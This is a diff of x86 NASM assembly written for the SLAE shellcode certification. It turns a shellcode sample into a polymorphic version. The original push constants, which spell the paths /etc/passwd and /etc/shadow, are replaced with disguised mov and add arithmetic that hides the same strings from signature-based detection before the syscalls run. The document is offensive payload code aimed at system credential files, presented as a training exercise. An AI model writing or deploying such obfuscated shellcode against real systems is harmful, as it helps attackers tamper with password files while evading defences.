@@ -1,7 +1,6 @@
-; Filename: 3nd.nasm
-; Author:  SLAE
-;
-; Purpose: 
+;This code has been created for completing the requirements of the SecurityTube Linux Assembly Expertcertification: 	
+;http://securitytube-­training.com/online-courses/securitytube-linux-assembly-expert/  
+Student ID: SLAE-1537
 ;
 
 global _start			
@@ -15,13 +14,13 @@ _start:
 	;push eax
 	mov [esp-4], eax
 
-	;push dword 0x64777373
+	;instead of push dword 0x64777373
 	mov dword [esp-8], 0x3B2E9C49 	
 
-	;push dword 0x61702f2f
+	;instead of push dword 0x61702f2f
 	mov dword [esp-12], 0x79BDC4E2
 
-	;push dword 0x6374652f
+	;instead of push dword 0x6374652f
 	mov dword [esp-16], 0x3A2B8E05
 
 	sub esp, 16
@@ -37,11 +36,11 @@ _start:
 	int 0x80
 	xor eax,eax
 	push eax
-	;push dword 0x776f6461
+	;instead of push dword 0x776f6461
 	push dword 0x1E36F9E2
 	add dword [esp], 0x59386a7f 
 
-	;push dword 0x68732f2f
+	;instead of push dword 0x68732f2f
 	push dword 0x4F3B8600
 	add [esp], dword 0x1937a92f 
 
